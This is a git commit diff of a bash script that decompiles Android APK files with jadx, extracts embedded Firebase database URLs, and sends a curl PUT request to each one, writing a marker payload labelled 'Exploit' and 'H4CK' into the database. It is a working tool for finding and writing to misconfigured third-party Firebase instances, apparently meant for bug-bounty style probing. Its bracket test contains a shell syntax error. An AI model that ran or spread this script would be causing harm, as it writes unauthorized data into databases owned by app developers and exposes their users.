0409d9f22396725d33370370592f6a0ac3554e7e
Mr_k <37184529+erohsikero@users.noreply.github.com>
2024-12-29 11:18:19 -0500

    Update jadx_firebase.sh

--- jadx_firebase.sh
+++ jadx_firebase.sh
@@ -1,11 +1,21 @@
 #!/bin/bash
-jadxfirbase{
+function analyze_apk() {
+    # Check if any APK files are present
+    if [ -z "$(ls *.apk 2>/dev/null)" && -z "$(ls *.xapk 2>/dev/null)" ]; then
+        echo "No APK files found in the current directory."
+        return 1
+    fi
+    # Decompile APK files using jadx
     jadx *.apk
+    jadx *.xapk
+    # Extract URLs containing 'firebaseio'
     urls=$(grep -w 'firebaseio' -r ./ | grep -Eo 'https?://[^ ]+[^<]*' | sed 's|</string>||g')
+    # JSON data to send
     json_data='{"Exploit":"Successfull", "H4CK": "404"}'
+    # Response file to store results
+    response_file="all_responses.txt"
 
-    response_file="/usr//bb_results/jadxresults/all_responses.txt"
-    > "$response_file"
+    # Loop through each URL and send the request
     for url in $urls; do
         echo "Sending request to: ${url}/test404.json"
         response=$(curl -s -w "%{http_code}" -o response_body.txt -X PUT -H "Content-Type: application/json" -d "$json_data" "${url}/test404.json")
@@ -19,3 +29,4 @@ jadxfirbase{
     done
     echo "All responses stored in $response_file"
 }
+
